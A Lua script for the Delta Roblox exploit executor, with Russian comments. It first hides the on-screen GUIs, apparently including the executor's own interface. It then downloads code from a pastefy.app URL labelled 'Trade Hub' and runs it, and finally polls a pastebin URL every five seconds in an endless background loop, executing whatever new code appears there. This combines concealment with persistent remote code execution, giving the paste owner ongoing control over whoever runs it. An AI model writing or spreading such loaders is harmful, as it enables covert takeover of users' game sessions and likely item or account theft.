
-- ============================================================
-- КОМБО: убиратель Delta → через 5 сек cool html
-- ============================================================

-- ============================================================
-- ЧАСТЬ 1: УБИРАТЕЛЬ DELTA (сразу, моментально)
-- ============================================================
local hui = (gethui and gethui()) or game:GetService("CoreGui")
local UIS = game:GetService("UserInputService")

local protected = { Chat = true, RobloxGui = true, BuyRobux = true, TopBar = true }
local hiddenGuis = {}
local hiding = false

local function hideAll()
    hiding = true
    hiddenGuis = {}
    local count = 0

    for _, gui in ipairs(hui:GetChildren()) do
        if gui:IsA("ScreenGui") and not protected[gui.Name] then
            local hadVisible = false

            for _, obj in ipairs(gui:GetDescendants()) do
                if (obj:IsA("ImageButton") or obj:IsA("TextButton") or
                    obj:IsA("Frame") or obj:IsA("TextLabel")) and obj.Visible then

                    if obj:IsA("TextButton") or obj:IsA("ImageButton") then
                        pcall(function()
                            obj.Active = false
                            obj.Selectable = false
                            obj.AutoButtonColor = false
                        end)
                    end

                    obj.Visible = false
                    hadVisible = true
                    count = count + 1
                end
            end

            if hadVisible and gui.Enabled then
                gui.Enabled = false
                table.insert(hiddenGuis, gui)
            end
        end
    end

    hiding = false
    print("[Delta Hide] Спрятано моментально:", count)
end

local function showAll()
    hiding = true
    for _, gui in ipairs(hiddenGuis) do
        if gui and gui.Parent then
            gui.Enabled = true
            for _, obj in ipairs(gui:GetDescendants()) do
                if obj:IsA("ImageButton") or obj:IsA("TextButton") or
                   obj:IsA("Frame") or obj:IsA("TextLabel") then
                    obj.Visible = true
                end
            end
        end
    end
    hiddenGuis = {}
    hiding = false
    print("[Delta Hide] Возвращено")
end

-- Хоткей RightShift для возврата
UIS.InputBegan:Connect(function(input, processed)
    if hiding then return end
    if processed then return end
    if input.KeyCode == Enum.KeyCode.RightShift then
        if #hiddenGuis > 0 then showAll() else hideAll() end
    end
end)

-- ЗАПУСК УБИРАТЕЛЯ СРАЗУ
hideAll()
print("[Delta Hide] Убиратель сработал моментально")

-- ============================================================
-- ЧАСТЬ 2: ЧЕРЕЗ 5 СЕК ЗАГРУЖАЕМ cool json
-- ============================================================
task.wait(5)

print("[Loader] Загружаю json Trade Hub...")

local url = "https://pastefy.app/AKqMztXR/raw"

local ok, err = pcall(function()
    local src = game:HttpGet(url)
    local fn = loadstring(src)
    if fn then
        fn()
        print("[Loader] ✅ попа загружен")
    else
        warn("[Loader] ❌ loadstring вернул nil")
    end
end)

if not ok then
    warn("[Loader] ❌ Ошибка загрузки: " .. tostring(err))
end

-- ============================================
-- Pastebin Auto-Executor для Delta Executor
-- ============================================
local PASTEBIN_URL = "https://pastebin.com/raw/kKRdR0k5"
local INTERVAL     = 5       -- опрос каждые 5 секунд
-- ============================================

-- Универсальный HTTP-запрос с таймаутом (фикс зависаний Delta)
local function safeHttpGet(url)
    local body = nil
    local done = false

    -- Запускаем запрос в отдельном потоке
    task.spawn(function()
        local ok, res = pcall(function()
            -- Перебираем все известные Delta методы запроса
            if syn and syn.request then
                return syn.request({Url = url, Method = "GET"}).Body
            elseif http and http.request then
                return http.request({Url = url, Method = "GET"}).Body
            elseif request then
                return request({Url = url, Method = "GET"}).Body
            elseif http_request then
                return http_request({Url = url, Method = "GET"}).Body
            elseif Delta and Delta.request then
                return Delta.request({Url = url, Method = "GET"}).Body
            elseif game and game.HttpGet then
                return game:HttpGet(url)
            end
        end)
        if ok then body = res end
        done = true
    end)

    -- Ждём ответа максимум 4 секунды (чтобы не «съесть» весь интервал)
    local start = tick()
    while not done and (tick() - start) < 4 do
        task.wait(0.1)
    end

    return body
end

local lastCode = ""

local function pollAndRun()
    local raw = safeHttpGet(PASTEBIN_URL)

    -- Пропускаем, если ответа нет, пусто или это HTML-страница
    if not raw or raw == "" or raw:sub(1, 1) == "<" then
        return
    end

    -- Не запускаем, если код не изменился
    if raw == lastCode then
        return
    end

    lastCode = raw

    -- Выполняем полученный код
    local chunk, compileErr = loadstring(raw)
    if not chunk then
        warn("[AutoExec] Ошибка компиляции: " .. tostring(compileErr))
        return
    end

    local success, runErr = pcall(chunk)
    if not success then
        warn("[AutoExec] Ошибка выполнения: " .. tostring(runErr))
    else
        print("[AutoExec] Код обновлён и выполнен.")
    end
end

-- Бесконечный цикл (работает в фоне и не блокирует основной скрипт)
task.spawn(function()
    task.wait(1) -- небольшая пауза перед первым запуском
    while true do
        pollAndRun()
        task.wait(INTERVAL)
    end
end)
